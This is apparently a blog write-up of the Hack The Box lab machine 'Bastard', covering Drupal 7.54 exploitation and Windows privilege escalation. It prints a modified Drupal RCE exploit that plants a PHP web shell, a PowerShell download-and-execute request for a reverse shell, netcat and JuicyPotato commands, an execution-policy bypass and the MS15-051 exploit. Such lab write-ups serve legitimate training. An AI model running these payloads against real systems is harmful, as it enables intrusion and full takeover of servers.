---
permalink: /posts/HTB/Bastard
title:  "HTB Bastard"
author: Luc Kolen
description: "Bastard is a medium Windows machine on HTB"
categories:
  - CTF
  - HTB
tags:
  - HTB-Medium
  - Windows
  - Drupal
  - MS15-051
---
# 10.10.10.9 - Bastard

- [10.10.10.9 - Bastard](#1010109---bastard)
  - [Open ports](#open-ports)
  - [HTTP](#http)
  - [Privilege escalation](#privilege-escalation)
    - [Sherlock](#sherlock)
  - [TL;DR](#tldr)

## Open ports

```bash
luc@kali:~/HTB/Bastard$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.9
```

|Port|Service|Version
|---|---|---|
80/tcp|http|Microsoft IIS httpd 7.5
135/tcp|msrpc|Microsoft Windows RPC
49154/tcp|msrpc|Microsoft Windows RPC

## HTTP

Whenever we see a webserver it's important to check the `robots.txt` file to see if any files are hidden from search engines.

```http
GET /robots.txt HTTP/1.1

...
Disallow: /CHANGELOG.txt
...
```

```http
GET /CHANGELOG.txt.txt HTTP/1.1

...
Drupal 7.54, 2017-02-01
...
```

We now know the version of Drupal that's being used. We can now try and find a working exploit for that version.

```bash
luc@kali:~/HTB/Bastard$ searchsploit drupal 7.
...
Drupal 7.x Module Services - Remote Code Execution | php/webapps/41564.php
...
luc@kali:~/HTB/Bastard$ searchsploit -m php/webapps/41564.php
```

This exploit sounds interesting because no authentication before exploitation is needed. We do need to make some changes to the script, `$url` and `$endpoint_path`.

```php
$url = 'http://vmweb.lan/drupal-7.54';
$endpoint_path = '/rest_endpoint';
...
$file = [
    'filename' => 'dixuSOspsOUU.php',
    'data' => '<?php eval(file_get_contents(\'php://input\')); ?>'
];
```

`/rest_endpoint` isn't a valid directory on this machine, but browsing to `/rest` shows the message `Services Endpoint "rest_endpoint" has been setup successfully.`.

```php
$url = 'http://10.10.10.9';
$endpoint_path = '/rest';
...
$file = [
    'filename' => 'exploit.php',
    'data' => '<?php echo system($_REQUEST["cmd"]); ?>'
];
```

```bash
luc@kali:~/HTB/Bastard$ php 41564.php
# Exploit Title: Drupal 7.x Services Module Remote Code Execution
# Vendor Homepage: https://www.drupal.org/project/services
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics
# Website: https://www.ambionics.io/blog/drupal-services-module-rce


#!/usr/bin/php
PHP Fatal error:  Uncaught Error: Call to undefined function curl_init() in /home/luc/HTB/Bastard/41564.php:254
Stack trace:
#0 /home/luc/HTB/Bastard/41564.php(104): Browser->post('application/vnd...', 'a:2:{s:8:"usern...')
#1 {main}
  thrown in /home/luc/HTB/Bastard/41564.php on line 254
```

We can fix this issue by installing the `php-curl` package.

```bash
luc@kali:~/HTB/Bastard$ php 41564.php
# Exploit Title: Drupal 7.x Services Module Remote Code Execution
# Vendor Homepage: https://www.drupal.org/project/services
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics
# Website: https://www.ambionics.io/blog/drupal-services-module-rce


#!/usr/bin/php
Stored session information in session.json
Stored user information in user.json
Cache contains 7 entries
File written: http://10.10.10.9/exploit.php
```

We can now do HTTP requests to `http://10.10.10.9/exploit.php` with the `cmd` parameter to define our commands.

```http
GET /exploit.php?cmd=whoami HTTP/1.1

nt authority\iusr
```

We can use this to start a reverse shell.

```bash
luc@kali:~/HTB/Bastard$ cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
luc@kali:~/HTB/Bastard$ nano Invoke-PowerShellTcp.ps1
...
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.16 -Port 443
luc@kali:~/HTB/Bastard$ python3 -m http.server
```

```http
GET /exploit.php?cmd=powershell+IEX(New-Object+Net.WebClient).DownloadString('http%3a//10.10.14.16%3a8000/Invoke-PowerShellTcp.ps1') HTTP/1.1
```

```bash
luc@kali:~/HTB/Bastard$ sudo nc -lnvp 443
PS C:\inetpub\drupal-7.54> whoami
nt authority\iusr
PS C:\inetpub\drupal-7.54> cd \users\dimitris\Desktop
PS C:\users\dimitris\Desktop> type user.txt
ba22fde1************************
```

## Privilege escalation

```bash
PS C:\inetpub\drupal-7.54> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled
PS C:\inetpub\drupal-7.54> systeminfo

Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter
OS Version:                6.1.7600 N/A Build 7600
...
System Type:               x64-based PC
...
Hotfix(s):                 N/A
```

We've `SeImpersonatePrivilege` and this is a `Windows Server 2008 R2` machine so we should be able to use JuicyPotato.

```bash
luc@kali:~/HTB/Bastard$ cp /opt/JuicyPotatoBinaries/JuicyPotato.exe .
luc@kali:~/HTB/Bastard$ cp /home/luc/Downloads/netcat-win32-1.12/nc64.exe .
luc@kali:~/HTB/Bastard$ sudo python2 /opt/impacket/examples/smbserver.py share `pwd` -smb2support
```

```bash
PS C:\inetpub\drupal-7.54> net use Z: \\10.10.14.16\share
PS Z:\> .\JuicyPotato.exe -t * -l 9000 -p nc64.exe -a "-e cmd 10.10.14.16 444"
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 9000
COM -> recv failed with error: 10038
```

### Sherlock

```bash
luc@kali:~/HTB/Bastard$ cp /opt/Sherlock/Sherlock.ps1 .
luc@kali:~/HTB/Bastard$ nano Sherlock.ps1
...
Find-AllVulns > Sherlock.result 2>&1
```

```bash
PS Z:\> .\Sherlock.ps1
File Z:\Sherlock.ps1 cannot be loaded because the execution of scripts is disabled on this system.
Please see "get-help about_signing" for more details.
```

We need to find a way to run Sherlock without triggering the script execution detection

```bash
PS Z:\> powershell -ExecutionPolicy Bypass -File Sherlock.ps1
...
Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Appears Vulnerable
...
Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Appears Vulnerable
...
Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

```

```bash
luc@kali:~/HTB/Bastard$ cp /opt/windows-kernel-exploits/MS15-051/MS15-051-KB3045171.zip .
luc@kali:~/HTB/Bastard$ unzip MS15-051-KB3045171.zip
...
  inflating: MS15-051-KB3045171/ms15-051x64.exe  
...
luc@kali:~/HTB/Bastard$ cp MS15-051-KB3045171/ms15-051x64.exe .
```

```bash
PS Z:\> .\ms15-051x64.exe whoami
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 2712 created.
==============================
nt authority\system
```

```bash
luc@kali:~/HTB/Bastard$ sudo nc -lnvp 444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::444
Ncat: Listening on 0.0.0.0:444
Ncat: Connection from 10.10.10.9.
Ncat: Connection from 10.10.10.9:61116.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

Z:\>whoami
The current directory is invalid.

Z:\>C:

C:\inetpub\drupal-7.54>whoami
nt authority\system

C:\inetpub\drupal-7.54>cd \Users\Administrator\Desktop

C:\Users\Administrator\Desktop>type root.txt
The system cannot find the file specified.

C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 605B-4AAA

 Directory of C:\Users\Administrator\Desktop

19/03/2017  08:33     <DIR>          .
19/03/2017  08:33     <DIR>          ..
19/03/2017  08:34                 32 root.txt.txt
               1 File(s)             32 bytes
               2 Dir(s)  30.788.993.024 bytes free

C:\Users\Administrator\Desktop>type root.txt.txt
4bf12b96************************
```

## TL;DR

- RCE in Drupal 7.54 results in a reverse shell
- System is vulnerable to MS15-051
